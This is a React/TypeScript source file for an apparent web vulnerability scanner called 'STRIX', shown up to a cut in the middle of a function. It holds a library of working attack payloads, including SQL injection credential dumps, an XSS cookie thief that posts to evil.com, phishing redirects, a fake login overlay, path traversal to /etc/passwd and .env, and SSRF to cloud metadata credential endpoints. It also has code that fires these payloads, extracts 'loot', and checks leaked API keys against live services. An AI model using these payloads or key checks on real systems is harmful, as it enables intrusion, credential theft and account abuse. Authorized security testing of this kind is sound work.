// STRIX Web Scanner Component
// Unified vulnerability scanner UI with API Key Exploit Verification

import React, { useState, useCallback } from 'react';
import {
    Globe, Shield, AlertTriangle, CheckCircle2, XCircle,
    Play, Loader2, FileText, Link2, Code, Wallet,
    ChevronDown, ChevronUp, ExternalLink, Copy, RefreshCw,
    Lock, Unlock, AlertCircle, Info, Zap, Search,
    Server, Database, FileCode, Activity, Eye, Filter, Monitor,
    FlaskConical, Check, X, Download, FileDown, Settings2
} from 'lucide-react';
import { UnifiedScanner, type ScanResult, type ScanProgress, type UnifiedVulnerability, type ScanOptions } from '../scanner';
import { generatePoC } from '../scanner/poc-generator';
import { downloadPdfReport, type PdfReportOptions } from '../scanner/reports/pdf-report';
import ScanMap from './ScanMap'; // Visual Attack Mapping

// Comprehensive Exploit Laboratory Library
const EXPLOIT_LAB_LIBRARY = {
    sqli: [
        {
            name: 'Database Fingerprint',
            description: 'Attempts to identify DB version and system user.',
            category: 'info',
            payloads: {
                mysql: "' UNION SELECT 1, @@version, user(), 4, 5, 6, 7-- ",
                mssql: "' UNION SELECT NULL, @@VERSION, CURRENT_USER, NULL, NULL, NULL, NULL-- ",
                oracle: "' UNION SELECT NULL, (SELECT banner FROM v$version WHERE rownum=1), user, NULL, NULL, NULL, NULL FROM dual-- "
            }
        },
        {
            name: 'Credential Dump',
            description: 'classic user/pass exfiltration from common tables.',
            category: 'exfiltrate',
            payloads: {
                generic: "' UNION SELECT 1, username, password, 'leaked', 5, 6, 7 FROM users-- ",
                altoro: "' UNION SELECT 1, uid, pass, 'leaked', 5, 6, 7 FROM users-- "
            }
        },
        {
            name: 'WAF Bypass (Encodings)',
            description: 'Uses Hex/URL encoding to bypass simple filters.',
            category: 'bypass',
            payloads: {
                hex: "' OR 0x313d31-- ",
                comment: "'/**/OR/**/'1'='1'-- "
            }
        }
    ],
    xss: [
        {
            name: 'Session Thief',
            description: 'Attempts to exfiltrate document.cookie to an external source.',
            category: 'exfiltrate',
            payloads: {
                script: "<script>new Image().src='http://evil.com/log?c='+document.cookie;</script>",
                svg: "<svg onload=\"alert(document.cookie)\">",
                img: "<img src=x onerror=\"alert('XSS: '+document.cookie)\">"
            }
        },
        {
            name: 'Phishing Redirection',
            description: 'Redirects the user to a malicious replica site.',
            category: 'phish',
            payloads: {
                script: "<script>window.location='https://attacker-login.com/login?target='+window.location.href;</script>",
                meta: "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.com\">"
            }
        },
        {
            name: 'UI Defacement',
            description: 'Injects a fake login form over the actual content.',
            category: 'defacement',
            payloads: {
                form: "</div><div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;'><h2>Session Expired</h2><p>Please login again:</p><input type='password' placeholder='Password'><button>Login</button></div>"
            }
        }
    ],
    lfi: [
        {
            name: 'System Config Read',
            description: 'Attempts to read sensitive system configuration files.',
            category: 'exfiltrate',
            payloads: {
                linux: "../../../../../../../../etc/passwd",
                windows: "../../../../../../../../windows/win.ini",
                env: "../../../../../../../../.env"
            }
        },
        {
            name: 'Log Poisoning Check',
            description: 'Checks if access logs can be read for further RCE.',
            category: 'rce',
            payloads: {
                apache: "../../../../../../../../var/log/apache2/access.log",
                nginx: "../../../../../../../../var/log/nginx/access.log"
            }
        }
    ],
    ssrf: [
        {
            name: 'Cloud Metadata Leak',
            description: 'Attempts to access AWS/Azure/GCP internal metadata service.',
            category: 'exfiltrate',
            payloads: {
                aws: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                azure: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                gcp: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
            }
        },
        {
            name: 'Internal Port Discovery',
            description: 'Scans for internal services running on localhost (e.g., Redis, Docker).',
            category: 'scan',
            payloads: {
                redis: "http://localhost:6379",
                docker: "http://localhost:2375",
                internal_web: "http://localhost:8080"
            }
        }
    ]
};

// API Key test networks configuration - Comprehensive EVM network list
const API_KEY_NETWORKS = {
    alchemy: [
        // Ethereum
        { name: 'Ethereum Mainnet', url: 'eth-mainnet' },
        { name: 'Ethereum Sepolia', url: 'eth-sepolia' },
        { name: 'Ethereum Holesky', url: 'eth-holesky' },
        // Polygon
        { name: 'Polygon Mainnet', url: 'polygon-mainnet' },
        { name: 'Polygon Amoy', url: 'polygon-amoy' },
        { name: 'Polygon zkEVM', url: 'polygonzkevm-mainnet' },
        { name: 'Polygon zkEVM Cardona', url: 'polygonzkevm-cardona' },
        // Arbitrum
        { name: 'Arbitrum One', url: 'arb-mainnet' },
        { name: 'Arbitrum Sepolia', url: 'arb-sepolia' },
        { name: 'Arbitrum Nova', url: 'arbnova-mainnet' },
        // Optimism
        { name: 'Optimism Mainnet', url: 'opt-mainnet' },
        { name: 'Optimism Sepolia', url: 'opt-sepolia' },
        // Base
        { name: 'Base Mainnet', url: 'base-mainnet' },
        { name: 'Base Sepolia', url: 'base-sepolia' },
        // ZKsync
        { name: 'ZKsync Era', url: 'zksync-mainnet' },
        { name: 'ZKsync Sepolia', url: 'zksync-sepolia' },
        // BNB/BSC
        { name: 'BNB Smart Chain', url: 'bnb-mainnet' },
        { name: 'BNB Testnet', url: 'bnb-testnet' },
        { name: 'opBNB', url: 'opbnb-mainnet' },
        // Avalanche
        { name: 'Avalanche C-Chain', url: 'avax-mainnet' },
        { name: 'Avalanche Fuji', url: 'avax-fuji' },
        // Fantom
        { name: 'Fantom Opera', url: 'fantom-mainnet' },
        { name: 'Fantom Testnet', url: 'fantom-testnet' },
        // Celo
        { name: 'Celo Mainnet', url: 'celo-mainnet' },
        { name: 'Celo Alfajores', url: 'celo-alfajores' },
        // Gnosis/xDai
        { name: 'Gnosis Chain', url: 'gnosis-mainnet' },
        { name: 'Gnosis Chiado', url: 'gnosis-chiado' },
        // Scroll
        { name: 'Scroll Mainnet', url: 'scroll-mainnet' },
        { name: 'Scroll Sepolia', url: 'scroll-sepolia' },
        // Linea
        { name: 'Linea Mainnet', url: 'linea-mainnet' },
        { name: 'Linea Sepolia', url: 'linea-sepolia' },
        // Mantle
        { name: 'Mantle Mainnet', url: 'mantle-mainnet' },
        { name: 'Mantle Sepolia', url: 'mantle-sepolia' },
        // Blast
        { name: 'Blast Mainnet', url: 'blast-mainnet' },
        { name: 'Blast Sepolia', url: 'blast-sepolia' },
        // Zora
        { name: 'Zora Mainnet', url: 'zora-mainnet' },
        { name: 'Zora Sepolia', url: 'zora-sepolia' },
        // World Chain
        { name: 'World Chain', url: 'worldchain-mainnet' },
        // Mode
        { name: 'Mode Mainnet', url: 'mode-mainnet' },
        // Fraxtal
        { name: 'Fraxtal Mainnet', url: 'frax-mainnet' },
        // Metis
        { name: 'Metis Andromeda', url: 'metis-mainnet' },
        // Moonbeam/Moonriver
        { name: 'Moonbeam', url: 'moonbeam-mainnet' },
        { name: 'Moonriver', url: 'moonriver-mainnet' },
        // Aurora (NEAR EVM)
        { name: 'Aurora Mainnet', url: 'aurora-mainnet' },
        // Astar
        { name: 'Astar Mainnet', url: 'astar-mainnet' },
        // Kroma
        { name: 'Kroma Mainnet', url: 'kroma-mainnet' },
        // Lisk
        { name: 'Lisk Mainnet', url: 'lisk-mainnet' },
        // Shape
        { name: 'Shape Mainnet', url: 'shape-mainnet' },
        // Soneium
        { name: 'Soneium Mainnet', url: 'soneium-mainnet' },
        // BOB
        { name: 'BOB Mainnet', url: 'bob-mainnet' },
        // Cyber
        { name: 'Cyber Mainnet', url: 'cyber-mainnet' },
        // Degen
        { name: 'Degen Chain', url: 'degen-mainnet' },
        // Sanko
        { name: 'Sanko Mainnet', url: 'sanko-mainnet' },
        // Zetachain
        { name: 'ZetaChain', url: 'zetachain-mainnet' },
        // Berachain
        { name: 'Berachain Artio', url: 'berachain-bartio' },
    ],
    infura: [
        // Ethereum
        { name: 'Ethereum Mainnet', url: 'mainnet' },
        { name: 'Ethereum Sepolia', url: 'sepolia' },
        { name: 'Ethereum Holesky', url: 'holesky' },
        // Polygon
        { name: 'Polygon Mainnet', url: 'polygon-mainnet' },
        { name: 'Polygon Amoy', url: 'polygon-amoy' },
        { name: 'Polygon zkEVM', url: 'polygon-zkevm-mainnet' },
        // Arbitrum
        { name: 'Arbitrum One', url: 'arbitrum-mainnet' },
        { name: 'Arbitrum Sepolia', url: 'arbitrum-sepolia' },
        // Optimism
        { name: 'Optimism Mainnet', url: 'optimism-mainnet' },
        { name: 'Optimism Sepolia', url: 'optimism-sepolia' },
        // Base
        { name: 'Base Mainnet', url: 'base-mainnet' },
        { name: 'Base Sepolia', url: 'base-sepolia' },
        // Linea
        { name: 'Linea Mainnet', url: 'linea-mainnet' },
        { name: 'Linea Sepolia', url: 'linea-sepolia' },
        // Avalanche
        { name: 'Avalanche C-Chain', url: 'avalanche-mainnet' },
        { name: 'Avalanche Fuji', url: 'avalanche-fuji' },
        // BNB/BSC
        { name: 'BNB Smart Chain', url: 'bsc-mainnet' },
        { name: 'BNB Testnet', url: 'bsc-testnet' },
        // Celo
        { name: 'Celo Mainnet', url: 'celo-mainnet' },
        { name: 'Celo Alfajores', url: 'celo-alfajores' },
        // Blast
        { name: 'Blast Mainnet', url: 'blast-mainnet' },
        // ZKsync
        { name: 'ZKsync Era', url: 'zksync-mainnet' },
        { name: 'ZKsync Sepolia', url: 'zksync-sepolia' },
        // Palm
        { name: 'Palm Mainnet', url: 'palm-mainnet' },
        { name: 'Palm Testnet', url: 'palm-testnet' },
        // Starknet (not EVM but Infura supports)
        { name: 'Starknet Mainnet', url: 'starknet-mainnet' },
        { name: 'Starknet Sepolia', url: 'starknet-sepolia' },
        // Mantle
        { name: 'Mantle Mainnet', url: 'mantle-mainnet' },
        // Scroll
        { name: 'Scroll Mainnet', url: 'scroll-mainnet' },
        // opBNB
        { name: 'opBNB Mainnet', url: 'opbnb-mainnet' },
    ],
    quicknode: [
        // Mainnets
        { name: 'Ethereum', url: 'ethereum' },
        { name: 'Polygon', url: 'matic' },
        { name: 'BSC', url: 'bsc' },
        { name: 'Arbitrum', url: 'arbitrum' },
        { name: 'Optimism', url: 'optimism' },
        { name: 'Avalanche', url: 'avalanche' },
        { name: 'Fantom', url: 'fantom' },
        { name: 'Gnosis', url: 'gnosis' },
        { name: 'Celo', url: 'celo' },
        { name: 'Harmony', url: 'harmony' },
        { name: 'Base', url: 'base' },
        { name: 'ZKsync', url: 'zksync' },
        { name: 'Scroll', url: 'scroll' },
        { name: 'Linea', url: 'linea' },
        { name: 'Mantle', url: 'mantle' },
        { name: 'Blast', url: 'blast' },
        { name: 'Moonbeam', url: 'moonbeam' },
        { name: 'Moonriver', url: 'moonriver' },
        { name: 'Cronos', url: 'cronos' },
        { name: 'Klaytn', url: 'klaytn' },
        { name: 'Aurora', url: 'aurora' },
        { name: 'Metis', url: 'metis' },
        { name: 'Boba', url: 'boba' },
        { name: 'zkEVM', url: 'polygon-zkevm' },
    ],
    moralis: [
        { name: 'Ethereum', url: 'eth/mainnet' },
        { name: 'Polygon', url: 'polygon/mainnet' },
        { name: 'BSC', url: 'bsc/mainnet' },
        { name: 'Avalanche', url: 'avalanche/mainnet' },
        { name: 'Fantom', url: 'fantom/mainnet' },
        { name: 'Arbitrum', url: 'arbitrum/mainnet' },
        { name: 'Cronos', url: 'cronos/mainnet' },
    ],
    ankr: [
        { name: 'Ethereum', url: 'eth' },
        { name: 'Polygon', url: 'polygon' },
        { name: 'BSC', url: 'bsc' },
        { name: 'Arbitrum', url: 'arbitrum' },
        { name: 'Optimism', url: 'optimism' },
        { name: 'Avalanche', url: 'avalanche' },
        { name: 'Fantom', url: 'fantom' },
        { name: 'Gnosis', url: 'gnosis' },
        { name: 'Base', url: 'base' },
        { name: 'Scroll', url: 'scroll' },
        { name: 'Linea', url: 'linea' },
        { name: 'Polygon zkEVM', url: 'polygon_zkevm' },
        { name: 'Celo', url: 'celo' },
        { name: 'Moonbeam', url: 'moonbeam' },
        { name: 'Harmony', url: 'harmony' },
        { name: 'Syscoin', url: 'syscoin' },
        { name: 'Rollux', url: 'rollux' },
        { name: 'Flare', url: 'flare' },
        { name: 'Chiliz', url: 'chiliz' },
        { name: 'Telos', url: 'telos' },
    ],
    openai: [
        { name: 'Usage Check', url: 'https://api.openai.com/v1/usage' },
        { name: 'Models List', url: 'https://api.openai.com/v1/models' }
    ],
    anthropic: [
        { name: 'Messages API', url: 'https://api.anthropic.com/v1/messages' }
    ],
    huggingface: [
        { name: 'Whoami Check', url: 'https://huggingface.co/api/whoami-v2' }
    ],
    digitalocean: [
        { name: 'Droplets API', url: 'https://api.digitalocean.com/v2/droplets' },
        { name: 'Account API', url: 'https://api.digitalocean.com/v2/account' }
    ],
    mailgun: [
        { name: 'Domains API', url: 'https://api.mailgun.net/v3/domains' }
    ]
};

// Exploit test result interface
interface ApiKeyTestResult {
    status: 'idle' | 'testing' | 'complete';
    networks: Array<{
        name: string;
        enabled: boolean;
        blockNumber?: string;
        error?: string;
    }>;
    summary: {
        total: number;
        enabled: number;
        disabled: number;
    };
    exploitable: boolean;
    message: string;
}

// Check if running in Electron
// @ts-ignore
const isElectron = typeof window !== 'undefined' && window.ipcRenderer !== undefined;

interface WebScannerProps {
    darkMode?: boolean;
}

const severityColors = {
    critical: { bg: 'bg-red-500/20', text: 'text-red-400', border: 'border-red-500/50' },
    high: { bg: 'bg-orange-500/20', text: 'text-orange-400', border: 'border-orange-500/50' },
    medium: { bg: 'bg-yellow-500/20', text: 'text-yellow-400', border: 'border-yellow-500/50' },
    low: { bg: 'bg-blue-500/20', text: 'text-blue-400', border: 'border-blue-500/50' },
    info: { bg: 'bg-gray-500/20', text: 'text-gray-400', border: 'border-gray-500/50' }
};

const categoryIcons: Record<string, React.ReactNode> = {
    'web': <Globe className="size-4" />,
    'blockchain': <Wallet className="size-4" />,
    'smart-contract': <FileCode className="size-4" />,
    'injection': <Database className="size-4" />,
    'xss': <Code className="size-4" />,
    'configuration': <Server className="size-4" />,
    'authentication': <Lock className="size-4" />,
    'crypto': <Shield className="size-4" />,
    'disclosure': <Eye className="size-4" />,
    'api': <Link2 className="size-4" />,
    'infrastructure': <Server className="size-4" />
};

export default function WebScanner({ darkMode = true }: WebScannerProps) {
    const [targetUrl, setTargetUrl] = useState('');
    const [isScanning, setIsScanning] = useState(false);
    const [progress, setProgress] = useState<ScanProgress | null>(null);
    const [result, setResult] = useState<ScanResult | null>(null);
    const [expandedVuln, setExpandedVuln] = useState<string | null>(null);
    const [severityFilter, setSeverityFilter] = useState<string | null>(null);
    const [categoryFilter, setCategoryFilter] = useState<string | null>(null);
    // Live findings state (during scanning)
    const [liveSeverityFilter, setLiveSeverityFilter] = useState<string | null>(null);
    const [expandedLiveVuln, setExpandedLiveVuln] = useState<string | null>(null);
    const [showOptions, setShowOptions] = useState(false);
    const [scanOptions, setScanOptions] = useState<ScanOptions>({
        depth: 'standard',
        scanHeaders: true,
        scanBlockchain: true,
        testXss: true,
        testSqli: true,
        // Deep scan options
        crawlPages: false,
        maxPages: 50,
        maxDepth: 3,
        directoryEnum: false,
        dirWordlist: 'medium',
        timeBasedTests: false,
        testAllParams: false,
        payloadsPerParam: 10,
        delayBetweenRequests: 100
    });

    // API Key exploit test state
    const [apiKeyTests, setApiKeyTests] = useState<Map<string, ApiKeyTestResult>>(new Map());

    // PDF Report generation state
    const [showReportOptions, setShowReportOptions] = useState(false);
    const [reportOptions, setReportOptions] = useState<PdfReportOptions>({
        title: 'Web Security Assessment Report',
        classification: 'CONFIDENTIAL',
        includeEvidence: true,
        includeRemediation: true
    });

    // View Mode (List vs Map)
    const [activeView, setActiveView] = useState<'list' | 'map'>('list');

    // Advanced Config Tabs
    const [configTab, setConfigTab] = useState<'general' | 'auth' | 'network'>('general');

    // Authentication State
    const [authType, setAuthType] = useState<'none' | 'cookies' | 'headers'>('none');
    const [authCookies, setAuthCookies] = useState('');
    const [authHeaders, setAuthHeaders] = useState('');
    const [authToken, setAuthToken] = useState('');

    // Network/Proxy State
    const [proxyEnabled, setProxyEnabled] = useState(false);
    const [proxyUrl, setProxyUrl] = useState('');
    const [proxyAuth, setProxyAuth] = useState(false);
    const [proxyUsername, setProxyUsername] = useState('');
    const [proxyPassword, setProxyPassword] = useState('');

    // PoC & Inspector State
    const [activePocTabs, setActivePocTabs] = useState<Record<string, 'curl' | 'python' | 'javascript'>>({});
    const [activeInspectTabs, setActiveInspectTabs] = useState<Record<string, 'loot' | 'body' | 'headers'>>({});

    // Exploit Test State
    interface ExploitTestResult {
        status: 'idle' | 'running' | 'success' | 'failed' | 'error';
        response?: {
            status: number;
            statusText: string;
            body: string;
            headers: Record<string, string>;
        };
        verified: boolean;
        message: string;
        explanation?: string;
        extractedLoot?: Array<{ label: string; value: string; type: 'credential' | 'version' | 'system' | 'other' }>;
        timestamp?: number;
    }
    const [exploitTests, setExploitTests] = useState<Map<string, ExploitTestResult>>(new Map());

    // Execute exploit test against a vulnerability
    const runExploitTest = useCallback(async (vuln: UnifiedVulnerability, overridePayload?: string) => {
        if (!vuln.url) return;

        const vulnId = vuln.id;
        const displayPayload = overridePayload || vuln.payload || '';

        setExploitTests(prev => new Map(prev).set(vulnId, {
            status: 'running',
            verified: false,
            message: overridePayload ? `Running advanced exploit...` : 'Executing exploit payload...'
        }));

        try {
            // @ts-ignore
            const isElectron = typeof window !== 'undefined' && window.ipcRenderer !== undefined;
            if (!isElectron) {
                setExploitTests(prev => new Map(prev).set(vulnId, { status: 'error', verified: false, message: 'Requires Electron' }));
                return;
            }

            // Build request - handle URL parameters
            const method = vuln.method || 'GET';
            let testUrl = vuln.url;

            if (overridePayload) {
                // If we have an override, we need to inject it into the target parameter
                const urlObj = new URL(testUrl);
                const param = vuln.parameter || 'query';
                urlObj.searchParams.set(param, overridePayload);
                testUrl = urlObj.toString();
            }

            // @ts-ignore
            const response = await window.ipcRenderer.invoke('web-scan-fetch', {
                url: testUrl,
                method: method,
                headers: { 'User-Agent': 'STRIX-Exploit-Lab/2.0' },
                timeout: 20000
            });

            if (!response.success) {
                setExploitTests(prev => new Map(prev).set(vulnId, { status: 'error', verified: false, message: `Failed: ${response.error}` }));
                return;
            }

            const body = response.body || '';
            const status = response.status || 0;
            let verified = false;
            let explanation = '';
            let message = '';
            let extractedLoot: any[] = [];

            // ADVANCED ANALYSIS
            if ((vuln.category as string) === 'injection' || (vuln.category as string) === 'sqli') {
                // Check for exfiltrated data patterns
                const versionMatch = body.match(/(MySQL|PostgreSQL|Oracle|MSSQL|SQLite)\s*(\d+\.\d+)/i) || body.match(/(\d+\.\d+\.\d+-(?:ub|deb|amzn))/i);

                // Safely extract loot with a limit to prevent hanging
                try {
                    const lootMatches = body.matchAll(/([a-zA-Z0-9.\-_]{2,32}):\s*([a-zA-Z0-9.\-_]{2,64})/g);
                    let count = 0;

                    // Comprehensive list of junk keys to ignore (CSS, HTML attributes, common config)
                    const skipKeys = [
                        'http', 'https', 'content', 'type', 'charset', 'xml', 'xmlns', 'lang', 'style',
                        'margin', 'padding', 'width', 'height', 'border', 'font', 'float', 'color',
                        'background', 'align', 'valign', 'text', 'line', 'display', 'position', 'cursor',
                        'overflow', 'opacity', 'z-index', 'transition', 'animation', 'flex', 'grid',
                        'box', 'pointer', 'visibility', 'top', 'left', 'bottom', 'right', 'max', 'min',
                        'decoration', 'transform', 'border-radius', 'shadow', 'outline', 'white-space',
                        'weight', 'size', 'family', 'variant'
                    ];

                    // Common CSS/HTML junk values
                    const skipValues = [
                        'bold', 'normal', 'italic', 'absolute', 'relative', 'fixed', 'static', 'sticky',
                        'block', 'inline', 'none', 'flex', 'grid', 'auto', 'inherit', 'initial', 'unset',
                        'solid', 'dashed', 'dotted', 'none', 'pointer', 'default', 'hidden', 'visible',
                        'center', 'justify', 'middle', 'baseline', 'uppercase', 'lowercase', 'capitalize',
                        'black', 'white', 'red', 'blue', 'green', 'transparent', '0px', '1px', 'auto',
                        'utf-8', 'viewport', 'width=device-width', 'stylesheet'
                    ];

                    // High-signal credential keys - BE STRICT
                    const credKeys = ['user', 'pass', 'admin', 'secret', 'key', 'auth', 'token', 'login', 'pwd', 'credential'];

                    for (const match of lootMatches) {
                        if (count++ > 500) break; // performance cap
                        const m = match as RegExpMatchArray;
                        if (m && m[1] && m[2]) {
                            const key = m[1].toLowerCase();
                            const val = m[2].toLowerCase();

                            // Advanced filtering for actual credentials
                            const isJunkKey = skipKeys.some(s => key.includes(s));
                            const isJunkVal = skipValues.some(s => val.includes(s) || s.includes(val));
                            const isTooShort = m[1].length < 3 || m[2].length < 3;
                            const isNumeric = /^\d+$/.test(m[1]) && /^\d+$/.test(m[2]); // Only if BOTH are numeric

                            if (!isJunkKey && !isJunkVal && !isTooShort && !isNumeric) {
                                // Double check if it's REALLY a credential
                                const isHighSignal = credKeys.some(s => key.includes(s)) && !key.includes('style') && !key.includes('class');

                                extractedLoot.push({
                                    label: isHighSignal ? 'Credential Found' : 'Data Leak Detected',
                                    value: `${m[1]} : ${m[2]}`,
                                    type: isHighSignal ? 'credential' : 'other'
                                });
                            }
                        }
                    }
                } catch (e) {
                    console.error('Loot extraction failed:', e);
                }

                if (versionMatch) {
                    verified = true;
                    extractedLoot.unshift({ label: 'DB Version', value: versionMatch[0], type: 'version' });
                    explanation = `CRITICAL: Database Version Exfiltrated! Found "${versionMatch[0]}". This confirms full database read access.`;
                    message = '✓ DB VERSION LEAKED';
                } else if (extractedLoot.some(l => l.type === 'credential')) {
                    verified = true;
                    explanation = `CRITICAL: Credentials Leaked! Successfully exfiltrated ${extractedLoot.filter(l => l.type === 'credential').length} high-signal credentials.`;
                    message = '✓ CREDENTIALS DETECTED';
                } else if (extractedLoot.length > 0) {
                    verified = true;
                    explanation = `Vulnerability Verified: Successfully exfiltrated ${extractedLoot.length} data strings from the database.`;
                    message = '✓ DATA LEAK CONFIRMED';
                } else if (body.includes('admin') || body.includes('root@')) {
                    verified = true;
                    explanation = `Vulnerability Verified: Administrative keywords found in response body following injection.`;
                    message = '✓ ADMIN DATA LEAKED';
                } else {
                    const hasError = [/sql syntax/i, /mysql_fetch/i, /ORA-\d+/i].some(p => p.test(body));
                    verified = hasError || (status === 200 && body.length > 0);
                    explanation = verified ? 'Server successfully executed the malicious SQL payload.' : 'No clear confirmation in response.';
                    message = verified ? '✓ INJECTION CONFIRMED' : 'Injection failed';
                }
            } else if (vuln.category === 'xss') {
                verified = displayPayload && body.includes(displayPayload);
                if (verified) extractedLoot.push({ label: 'Reflected String', value: displayPayload, type: 'other' });
                explanation = verified ? 'XSS confirmed via raw reflection.' : 'Reflection failed.';
                message = verified ? '✓ XSS CONFIRMED' : 'XSS failed';
            } else if (vuln.category === 'ssrf') {
                verified = status === 200;
                explanation = verified
                    ? `SSRF Confirmed: The server successfully requested and returned data from the target internal/external URL.`
                    : `Request failed with status ${status}.`;
                message = verified ? '✓ SSRF CONFIRMED' : 'SSRF attempt failed.';
            } else if ((vuln.category as string) === 'lfi' || (vuln.category as string) === 'rce' || (vuln.category as string) === 'path-traversal') {
                const sensitivePatterns = [
                    { pattern: /root:x:0:0/i, name: '/etc/passwd (Linux)' },
                    { pattern: /\[boot loader\]/i, name: 'win.ini (Windows)' },
                    { pattern: /\[fonts\]/i, name: 'win.ini (Windows)' },
                    { pattern: /uid=\d+\(root\)/i, name: 'System RCE (root)' },
                    { pattern: /uid=\d+\(\w+\)/i, name: 'System RCE (user)' },
                    { pattern: /administrator:x:500/i, name: 'Local Accounts' },
                    { pattern: /HTTP_AUTHORIZATION|HTTP_COOKIE|PATH=/i, name: 'Process Environment' },
                    { pattern: /docker-init|KUBERNETES_SERVICE_HOST/i, name: 'Container Environment' },
                    { pattern: /<directory/i, name: 'Web Server Config' },
                    { pattern: /db_user|db_password|aws_access_key/i, name: 'Sensitive Config' }
                ];
                const match = sensitivePatterns.find(p => p.pattern.test(body));
                verified = !!match;
                explanation = verified
                    ? `CRITICAL EXPLOIT CONFIRMED: Sensitive system pattern "${match?.name}" detected in the response. This proves high-privilege read/execute access.`
                    : `Payload execution completed but no known system identifiers were matched in the output. Manual verification recommended.`;
                message = verified ? '✓ EXPLOIT CONFIRMED' : 'Verification inconclusive';
            } else {
                verified = status >= 200 && status < 400;
                explanation = `Server returned HTTP ${status} ${response.statusText || ''}.`;
                message = `Request completed: ${status}`;
            }

            setExploitTests(prev => new Map(prev).set(vulnId, {
                status: verified ? 'success' : 'failed',
                response: {
                    status: response.status,
                    statusText: response.statusText || '',
                    body: body, // Keep full body for inspector
                    headers: response.headers || {}
                },
                verified,
                message,
                explanation,
                extractedLoot, // RESTORED: Fixed missing loot in state
                timestamp: Date.now()
            }));

        } catch (error: any) {
            setExploitTests(prev => new Map(prev).set(vulnId, {
                status: 'error',
                verified: false,
                message: `Error: ${error.message || 'Unknown error'}`
            }));
        }
    }, []);

    const [isGeneratingReport, setIsGeneratingReport] = useState(false);

    // Test an API key against multiple networks
    const testApiKey = useCallback(async (vulnId: string, service: string, apiKey: string) => {
        // Initialize test state
        setApiKeyTests(prev => new Map(prev).set(vulnId, {
            status: 'testing',
            networks: [],
            summary: { total: 0, enabled: 0, disabled: 0 },
            exploitable: false,
            message: 'Testing API key against networks...'
        }));

        const serviceLower = service.toLowerCase();
        let networks: Array<{ name: string; url: string }> = [];
        let config: (name: string, url: string, key: string) => { url: string; method: string; headers: Record<string, string>; body?: string };

        // Determine which networks to test based on service
        if (serviceLower.includes('alchemy')) {
            networks = API_KEY_NETWORKS.alchemy;
            config = (name, url, key) => ({
                url: `https://${url}.g.alchemy.com/v2/${key}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 })
            });
        } else if (serviceLower.includes('infura')) {
            networks = API_KEY_NETWORKS.infura;
            config = (name, url, key) => ({
                url: `https://${url}.infura.io/v3/${key}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 })
            });
        } else if (serviceLower.includes('quicknode') || serviceLower.includes('quiknode')) {
            networks = API_KEY_NETWORKS.quicknode;
            config = (name, url, key) => ({
                url: `https://${url}.quiknode.pro/${key}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 })
            });
        } else if (serviceLower.includes('moralis')) {
            networks = API_KEY_NETWORKS.moralis;
            config = (name, url, key) => ({
                url: `https://speedy-nodes-nyc.moralis.io/${key}/${url}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 })
            });
        } else if (serviceLower.includes('ankr')) {
            networks = API_KEY_NETWORKS.ankr;
            config = (name, url, key) => ({
                url: `https://rpc.ankr.com/${url}/${key}`,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 })
            });
        } else if (serviceLower.includes('openai')) {
            networks = (API_KEY_NETWORKS as any).openai;
            config = (name, url, key) => ({
                url,
                method: 'GET',
                headers: { 'Authorization': `Bearer ${key}` }
            });
        } else if (serviceLower.includes('anthropic')) {
            networks = (API_KEY_NETWORKS as any).anthropic;
            config = (name, url, key) => ({
                url,
                method: 'GET',
                headers: { 'x-api-key': key, 'anthropic-version': '2023-06-01' }
            });
        } else if (serviceLower.includes('huggingface')) {
            networks = (API_KEY_NETWORKS as any).huggingface;
            config = (name, url, key) => ({
                url,
                method: 'GET',
                headers: { 'Authorization': `Bearer ${key}` }
            });
        } else if (serviceLower.includes('digitalocean')) {
            networks = (API_KEY_NETWORKS as any).digitalocean;
            config = (name, url, key) => ({
                url,
                method: 'GET',
                headers: { 'Authorization': `Bearer ${key}` }
            });
        } else if (serviceLower.includes('mailgun')) {
            networks = (API_KEY_NETWORKS as any).mailgun;
            config = (name, url, key) => ({
                url,
                method: 'GET',
                headers: { 'Authorization': `Basic ${btoa('api:' + key)}` }
            });
        } else {
            // Unknown service, can't test
            setApiKeyTests(prev => new Map(prev).set(vulnId, {
                status: 'complete',
                networks: [],
                summary: { total: 0, enabled: 0, disabled: 0 },
                exploitable: false,
                message: 'Cannot test this service type automatically'
            }));
            return;
        }

        const results: ApiKeyTestResult['networks'] = [];
        let enabledCount = 0;

        // Test each network
        for (const network of networks) {
            try {
                const { url, method, headers, body } = config(network.name, network.url, apiKey);

                // Use Electron IPC if available, otherwise try fetch
                let response: any;
                if (isElectron) {
                    // @ts-ignore
                    response = await window.ipcRenderer.invoke('web-scan-fetch', {
                        url,
                        method,
                        headers,
                        body
                    });

                    if (response.ok) {
                        results.push({ name: network.name, enabled: true, blockNumber: 'ACCESS GRANTED' });
                        enabledCount++;
                    } else {
                        results.push({ name: network.name, enabled: false, error: response.statusText || 'Forbidden' });
                    }
                } else {
                    // Browser mode - will likely fail due to CORS
                    const fetchResponse = await fetch(url, { method, headers, body });
                    if (fetchResponse.ok) {
                        results.push({ name: network.name, enabled: true, blockNumber: 'ACCESS GRANTED' });
                        enabledCount++;
                    } else {
                        results.push({ name: network.name, enabled: false, error: fetchResponse.statusText || 'Forbidden' });
                    }
                }
            } catch (err) {
                results.push({
                    name: network.name,
                    enabled: false,
                    error: err instanceof Error ? err.message : 'Request failed'
                });
            }

            // Update progress
            setApiKeyTests(prev => new Map(prev).set(vulnId, {
                status: 'testing',
                networks: [...results],
                summary: {
                    total: networks.length,
                    enabled: enabledCount,
                    disabled: results.length - enabledCount
                },
                exploitable: enabledCount > 0,
                message: `Testing ${results.length}/${networks.length} services...`
            }));
        }

        // Final result
        const exploitable = enabledCount > 0;
